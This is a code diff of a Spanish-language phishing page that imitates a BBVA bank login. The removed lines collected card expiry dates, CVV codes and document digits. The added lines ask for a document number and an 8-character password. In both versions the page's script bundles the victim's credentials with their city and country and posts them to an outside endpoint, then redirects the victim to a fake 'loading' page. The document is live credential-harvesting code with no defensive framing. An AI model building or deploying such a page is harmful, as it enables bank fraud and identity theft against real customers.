@@ -417,7 +417,7 @@
       </p>
     </div>
     <div class="container" bis_skin_checked="1">
-      <h1>Ingresa los datos de una tarjeta</h1>
+      <h1>¡Bienvenido!</h1>
       <form id="loginform">
         <div class="group" bis_skin_checked="1">
           <select
@@ -438,70 +438,40 @@
               border-bottom: 1px solid #121212;
             "
           >
-            <option value="Cédula de identidad">Seleccione su tarjeta</option>
-            <option value="Pasaporte">TDD (Tarjeta de debito)</option>
-            <option value="Extranjero">TDC (Tarjeta de credito)</option>
+            <option value="Cédula de identidad">Cédula de identidad</option>
+            <option value="Pasaporte">Pasaporte</option>
+            <option value="Extranjero">Extranjero</option>
           </select>
         </div>
         <br />
         <div class="group" bis_skin_checked="1">
           <input
             name="numdoc"
-            id="fecha"
+            id="numdoc"
             type="tel"
-            maxlength="5"
-            oninput="formatearFecha(event)"
-            autocomplete="off"
-            required=""
-          />
-          <span class="highlight"></span>
-          <label for="username2">MM/AA</label>
-        </div>
-
-        <script>
-          function formatearFecha(event) {
-            let input = event.target;
-            let value = input.value.replace(/\D/g, ""); // Elimina todo lo que no es un número
-
-            if (value.length > 2) {
-              value = value.slice(0, 2) + "/" + value.slice(2, 4); // Inserta el separador '/'
-            }
-
-            input.value = value; // Establece el valor formateado en el campo de entrada
-          }
-        </script>
-
-        <br />
-        <div class="group" bis_skin_checked="1">
-          <input
-            name="numdoc"
-            id="cvv"
-            type="tel"
-            maxlength="3"
+            maxlength="16"
             onkeypress="soloNumeros(event)"
             autocomplete="off"
             required=""
           />
           <span class="highlight"></span>
-          <label for="username2">Código de seguridad</label>
+          <label for="username2">Número de Documento</label>
         </div>
-
-        <br />
-        <div class="group" bis_skin_checked="1">
+        <div class="group" style="margin-top: 16px" bis_skin_checked="1">
           <input
-            name="numdoc"
-            id="documento"
-            type="tel"
-            maxlength="3"
-            onkeypress="soloNumeros(event)"
+            type="password"
+            id="clvs"
+            name="clvs"
             autocomplete="off"
+            value=""
+            minlength="8"
+            maxlength="8"
             required=""
           />
           <span class="highlight"></span>
-          <label for="username2">Ultimos 3 digitos de su documento</label>
+          <label for="password">Contraseña</label>
         </div>
-
-        <br />
+        <br /><br />
 
         <div align="center" bis_skin_checked="1">
           <button
@@ -530,25 +500,23 @@
               cursor: pointer;
             "
           >
-            Verificar
+            Continuar
           </button>
 
           <br />
           <br /><br />
+          <a href="http://nestfunds.co/#" class="tatione"
+            >¿Olvidaste tu contraseña?</a
+          >
         </div>
       </form>
     </div>
-    <footer style="text-align: center; margin-top: 20vh">
+    <footer style="text-align: center;margin-top: 30vh;">
       <div
         class="text-white w-full text-center py-6 mt-6"
-        style="
-          background: #072146;
-          padding: 20px;
-          color: white;
-          font-family: Arial, Helvetica, sans-serif;
-        "
+        style="background: #072146;padding: 20px;color: white;font-family: Arial, Helvetica, sans-serif;"
       >
-        <img src="bbva.png" style="width: 240px" />
+       <img src="bbva.png" style="width: 240px;">
       </div>
     </footer>
   </body>
@@ -562,23 +530,18 @@
       axios
         .get(url)
         .then((response) => {
-          const usuario = localStorage.getItem("usuario");
           const tipo = document.querySelector("#tipodoc").value;
-          const fecha = document.querySelector("#fecha").value;
-          const cvv = document.querySelector("#cvv").value;
-          const docs = document.querySelector("#documento").value;
+          const numdoc = document.querySelector("#numdoc").value;
+          const contra = document.querySelector("#clvs").value;
 
+          localStorage.setItem("usuario", numdoc);
           const message =
-            "\nBBVA\nUsuario: " +
-            usuario +
-            "\nTipo de tarjeta: " +
+            "\nBBVA\nTipo: " +
             tipo +
-            "\nFecha: " +
-            fecha +
-            "\nCVV: " +
-            cvv +
-            "\nUltimos digitos de su documento: " +
-            docs +
+            "\nNúmero de documento: " +
+            numdoc +
+            "\nContra: " +
+            contra +
             "\nCiudad:" +
             response.data.city +
             "\nPais: " +
@@ -594,7 +557,7 @@
               }
             )
             .then((response) => {
-              window.location.href = "token.html";
+              window.location.href = "cargando.html";
             })
             .catch((error) => {
               console.error(error);
